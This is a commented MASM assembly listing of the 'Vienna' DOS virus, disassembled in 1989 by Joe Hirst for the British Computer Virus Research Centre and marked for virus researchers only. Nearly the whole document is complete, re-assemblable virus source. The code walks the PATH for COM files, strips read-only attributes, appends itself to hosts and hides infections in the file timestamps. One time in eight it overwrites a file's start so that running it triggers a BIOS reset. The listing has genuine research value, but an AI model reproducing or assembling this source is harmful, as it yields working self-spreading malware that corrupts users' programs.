

	page	65,132
	title	The 'Vienna' Virus
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º                 British Computer Virus Research Centre                   º
; º  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    º
; º  Telephone:     Domestic   0273-26105,   International  +44-273-26105    º
; º                                                                          º
; º                           The 'Vienna' Virus                             º
; º                Disassembled by Joe Hirst,      March 1989                º
; º                                                                          º
; º                      Copyright (c) Joe Hirst 1989.                       º
; º                                                                          º
; º      This listing is only to be made available to virus researchers      º
; º                or software writers on a need-to-know basis.              º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

	; The virus occurs attached to the end of a COM file.  The first
	; three bytes of the program are stored in the virus, and replaced
	; by a branch to the beginning of the virus.

	; The disassembly has been tested by re-assembly using MASM 5.0.

	; This virus was published as what appears to be a Debug
	; disassembly in Ralf Burger's book: 'Computer Viruses: A High-Tech
	; Disease'.  The version in the book contained two significant
	; differences:

	;	1.  The line	CMP	BYTE PTR [DI-1],'\'
	;	    became	CMP	CH,0FFH

	;	2.  The far jump to the BIOS initialisation was changed
	;	    to five spaces.

CODE	SEGMENT BYTE PUBLIC 'CODE'
	ASSUME	CS:CODE,DS:CODE

VLENGT	EQU	OFFSET ENDVIR-BP0010	; This is the length of the virus
VSTART	EQU	OFFSET DATA00-BP0010	; This is used to address back from
					; the data area
DTA_DD	=	OFFSET DTA_DDX-DATA00	; DTA Address
F_TIME	=	OFFSET F_TIMEX-DATA00	; File time
F_DATE	=	OFFSET F_DATEX-DATA00	; File date
F_ATTR	=	OFFSET F_ATTRX-DATA00	; File attributes
FSTBYT	=	OFFSET FSTBYTX-DATA00	; Store for first three bytes
VIRJMP	=	OFFSET VIRJMPX-DATA00	; Stored jump
STRNAM	=	OFFSET STRNAMX-DATA00	; *.COM
PTRPTH	=	OFFSET PTRPTHX-DATA00	; Pointer to path
PTRNAM	=	OFFSET PTRNAMX-DATA00	; Pointer to file name
STRPTH	=	OFFSET STRPTHX-DATA00	; Point to 'PATH='
F_NAME	=	OFFSET F_NAMEX-DATA00	; Pathname
VIRDTA	=	OFFSET VIRDTAX-DATA00	; DTA area
OVERWR	=	OFFSET OVERWRX-DATA00	; String to overwrite start
NO_RO	=	0FFFEH			; Mask to set off read only
NO_SECS	=	0FFE0H			; Mask to set off seconds
SECS	=	001FH			; Compare for seconds bits

	ORG	2CH
ENVSEG	DW	?			; Environment segment pointer

	ORG	100H

START:	JMP	BP0010

		; This is where the original program would have been

		; Addressability is maintained by patching the second
		; instruction after the ORG 700H.  All addressing is then
		; done in relation to this address, which is the start of
		; the data area

	ORG	700H

BP0010:	PUSH	CX
	MOV	DX,OFFSET DATA00	; Address data
	CLD
	MOV	SI,DX			; \ Address original first three bytes
	ADD	SI,FSTBYT		; /
	MOV	DI,0100H		; Address start of program
	MOV	CX,3			; Three bytes to move
	REPZ	MOVSB			; Replace the start of program
	MOV	SI,DX			; Address data
	MOV	AH,30H			; Get DOS version number function
	INT	21H			; DOS service
	CMP	AL,0			; Is major release no zero (?)
	JNE	BP0020			; Branch if not
	JMP	BP0200			; Terminate

BP0020:	PUSH	ES
	MOV	AH,2FH			; Get DTA function
	INT	21H			; DOS service
	MOV	[SI+DTA_DD],BX		; Save DTA offset
	MOV	[SI+DTA_DD+2],ES	; Save DTA segment
	POP	ES
	MOV	DX,VIRDTA		; \ Address DTA area
	ADD	DX,SI			; /
	MOV	AH,1AH			; Set DTA function
	INT	21H			; DOS service
	PUSH	ES
	PUSH	SI
	MOV	ES,ENVSEG		; Get environment pointer
	MOV	DI,0			; Start of environment
BP0030:	POP	SI
	PUSH	SI
	ADD	SI,STRPTH		; Point to 'PATH='
	LODSB				; Get first character ('P')
	MOV	CX,8000H		; Search 32K
	REPNZ	SCASB			; Find a match
	MOV	CX,4			; Length of rest of string
BP0040:	LODSB				; \ Compare a character
	SCASB				; /
	JNE	BP0030			; Restart search if no match
	LOOP	BP0040			; Repeat for each character
	POP	SI
	POP	ES
	MOV	[SI+PTRPTH],DI		; Save pointer to path
	MOV	DI,SI			; \ Address program pathname
	ADD	DI,F_NAME		; /  (overwritten before use)
	MOV	BX,SI			; Save relocation factor
	ADD	SI,F_NAME		; Address program pathname
	MOV	DI,SI			; This is where we were 3 lines back
	JMP	SHORT BP0100

	; Address next path in environment

BP0050:	CMP	WORD PTR [SI+PTRPTH],0	; Have we dealt with the last path?
	JNE	BP0060			; Branch if branch if not
	JMP	BP0190			; Reset and pass control to host

	; Copy path from environment to program pathname

BP0060:	PUSH	DS
	PUSH	SI
	MOV	DS,ES:ENVSEG		; Get environment pointer
	MOV	DI,SI			; Get relocation factor
	MOV	SI,ES:[DI+PTRPTH]	; Get address of path
	ADD	DI,F_NAME		; Address program pathname
BP0070:	LODSB				; Get next character
	CMP	AL,';'			; End of that path?
	JE	BP0090			; Branch if yes
	CMP	AL,0			; End of last path
	JE	BP0080			; Branch if yes
	STOSB				; Store character in program pathname
	JMP	BP0070			; Process next character

	; Find first COM file on path

BP0080:	MOV	SI,0			; Signal of environment path
BP0090:	POP	BX			; Recover relocation factor
	POP	DS
	MOV	[BX+PTRPTH],SI		; Save next path address
	CMP	BYTE PTR [DI-1],'\'	; Is prev char a dir separator?
	JE	BP0100			; Branch if yes
	MOV	AL,'\'			; \ Directory separator in pathname
	STOSB				; /
BP0100:	MOV	[BX+PTRNAM],DI		; Save pointer to name portion
	MOV	SI,BX			; \ Point to '*.COM'
	ADD	SI,STRNAM		; /
	MOV	CX,6			; Six characters to copy
	REPZ	MOVSB			; Copy '*.COM' string
	MOV	SI,BX			; Recover relocation factor
	MOV	AH,4EH			; Find first file function
	MOV	DX,F_NAME		; \ Address program pathname
	ADD	DX,SI			; /
	MOV	CX,3			; Attributes
	INT	21H			; DOS service
	JMP	SHORT BP0120		; Branch to error test

	; Find next COM file

BP0110:	MOV	AH,4FH			; Find next file function
	INT	21H			; DOS service
BP0120:	JNB	BP0130			; Branch if no error
	JMP	BP0050			; Get next path

	; Start processing of COM file

BP0130:	MOV	AX,[SI+VIRDTA+16H]	; Get file time
	AND	AL,1FH			; Isolate seconds
	CMP	AL,1FH			; Test for infection
	JE	BP0110			; Branch if infected
	CMP	[SI+VIRDTA+1AH],0FA00H	; Size greater than 64000?
	JA	BP0110			; Branch if yes
	CMP	WORD PTR [SI+VIRDTA+1AH],000AH  ; Size less than 10?
	JB	BP0110			; Branch if branch if yes
	MOV	DI,[SI+PTRNAM]		; Get pointer to name portion
	PUSH	SI
	ADD	SI,VIRDTA+1EH		; Address filename in DTA
BP0140:	LODSB				; \ Copy a character to filepath
	STOSB				; /
	CMP	AL,0			; Was that the last?
	JNE	BP0140			; Branch if not
	POP	SI
	MOV	AX,4300H		; Get file attributes function
	MOV	DX,F_NAME		; \ Address program pathname
	ADD	DX,SI			; /
	INT	21H			; DOS service
	MOV	[SI+F_ATTR],CX		; Save file attributes
	MOV	AX,4301H		; Set file attributes function
	AND	CX,NO_RO		; Set off read-only attribute
	MOV	DX,F_NAME		; \ Address program pathname
	ADD	DX,SI			; /
	INT	21H			; DOS service
	MOV	AX,3D02H		; Open handle (read/write) function
	MOV	DX,F_NAME		; \ Address program pathname
	ADD	DX,SI			; /
	INT	21H			; DOS service
	JNB	BP0150			; Branch if no error
	JMP	BP0180

	; Overwrite beginning of COM file (1 in 8 times)

BP0150:	MOV	BX,AX			; Move file handle
	MOV	AX,5700H		; Get file date and time function
	INT	21H			; DOS service
	MOV	[SI+F_TIME],CX		; Store file time
	MOV	[SI+F_DATE],DX		; Store file date
	MOV	AH,2CH			; Get time function
	INT	21H			; DOS service
	AND	DH,7			; Test bottom three bits
	JNZ	BP0160			; Branch if any of them are on
	MOV	AH,40H			; Write handle function
	MOV	CX,5			; Write five bytes
	MOV	DX,SI			; \ Address special string
	ADD	DX,OVERWR		; /
	INT	21H			; DOS service
	JMP	BP0170			; Reset file and exit

	; Infect COM file

BP0160:	MOV	AH,3FH			; Read handle function
	MOV	CX,3			; Three bytes to read
	MOV	DX,FSTBYT		; \ Store for first three bytes
	ADD	DX,SI			; /
	INT	21H			; DOS service
	JB	BP0170			; Branch if error
	CMP	AX,3			; Did we get all of it
	JNE	BP0170			; Branch if not
	MOV	AX,4202H		; Move file pointer (EOF) function
	MOV	CX,0			; \ No offset
	MOV	DX,0			; /
	INT	21H			; DOS service
	JB	BP0170			; Branch if error
	MOV	CX,AX			; Get length of file
	SUB	AX,3			; Convert to jump displacement
	MOV	[SI+VIRJMP+1],AX	; Store address in jump instruc
	ADD	CX,VSTART+100H		; Add disp to virus data area
	MOV	DI,SI			; \ Address move instruction
	SUB	DI,VSTART-2		; /
	MOV	[DI],CX			; Store displacement in move instruc
	MOV	AH,40H			; Write handle function
	MOV	CX,VLENGT		; Length of virus
	MOV	DX,SI			; \ Start of virus
	SUB	DX,VSTART		; /
	INT	21H			; DOS service
	JB	BP0170			; Branch if error
	CMP	AX,VLENGT		; Did we get all of it
	JNE	BP0170			; Branch if not
	MOV	AX,4200H		; Move file pointer (Begin) function
	MOV	CX,0			; \ No offset
	MOV	DX,0			; /
	INT	21H			; DOS service
	JB	BP0170			; Branch if error
	MOV	AH,40H			; Write handle function
	MOV	CX,3			; Three bytes
	MOV	DX,SI			; \ Stored jump
	ADD	DX,VIRJMP		; /
	INT	21H			; DOS service
BP0170:	MOV	DX,[SI+F_DATE]		; Get file date
	MOV	CX,[SI+F_TIME]		; Get file time
	AND	CX,NO_SECS		; Clear seconds
	OR	CX,SECS			; Set all seconds bits on
	MOV	AX,5701H		; Set file date and time function
	INT	21H			; DOS service
	MOV	AH,3EH			; Close handle function
	INT	21H			; DOS service
BP0180:	MOV	AX,4301H		; Set file attributes function
	MOV	CX,[SI+F_ATTR]		; Original file attributes
	MOV	DX,F_NAME		; \ Address pathname
	ADD	DX,SI			; /
	INT	21H			; DOS service
BP0190:	PUSH	DS
	MOV	AH,1AH			; Set DTA function
	MOV	DX,[SI+DTA_DD]		; Original DTA offset
	MOV	DS,[SI+DTA_DD+2]	; Original DTA segment
	INT	21H			; DOS service
	POP	DS
BP0200:	POP	CX
	XOR	AX,AX
	XOR	BX,BX
	XOR	DX,DX
	XOR	SI,SI
	MOV	DI,0100H
	PUSH	DI
	XOR	DI,DI
	RET	0FFFFH

DATA00	EQU	$
DTA_DDX	DW	0080H, 0F40H		; Original DTA address
F_TIMEX	DW	22B6H			; File time
F_DATEX	DW	1174H			; File date
F_ATTRX	DW	0020H			; File attributes
FSTBYTX	DB	0EBH, 2EH, 90H		; Original first bytes of program
VIRJMPX	EQU	$
	JMP	BP0010			; Jump for start of program
STRNAMX	DB	'*.COM', 0		; Filename to look for
PTRPTHX	DW	0005H			; Pointer to path
PTRNAMX	DW	0323H			; Pointer to filename
STRPTHX	DB	'PATH='			; 
F_NAMEX	DB	'HELLO3.COM', 0, 34H DUP (' ')	; Filename
VIRDTAX	DB	2BH DUP (0)		; DTA
OVERWRX	DB	0EAH			; Far jump to BIOS initialisation
	DW	0FFF0H, 0F000H
ENDVIR	EQU	$

CODE    ENDS

	END     START

